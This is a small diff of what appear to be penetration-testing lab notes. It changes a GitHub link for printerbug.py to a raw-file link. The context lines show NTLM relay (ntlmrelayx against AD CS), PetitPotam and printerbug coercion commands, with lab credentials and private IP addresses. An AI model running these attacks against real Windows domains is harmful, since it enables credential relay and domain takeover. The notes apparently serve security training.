@@ -181,7 +181,7 @@ impacket-ntlmrelayx -t http://10.0.30.19/certsrv/certfnsh.asp -smb2support --adc
 # PetitPotam
 python3 PetitPotam.py -u jtrueblood -p 'blood_brothers' -d shadow.gate <YOUR_IP> 10.0.30.19
 
-# printerbug - https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py
+# printerbug - https://github.com/dirkjanm/krbrelayx/raw/refs/heads/master/printerbug.py
 python3 printerbug.py INLANEFREIGHT.LOCAL/wwhite:"package5shores_topher1"@10.129.234.109 10.10.16.12
 ```
 
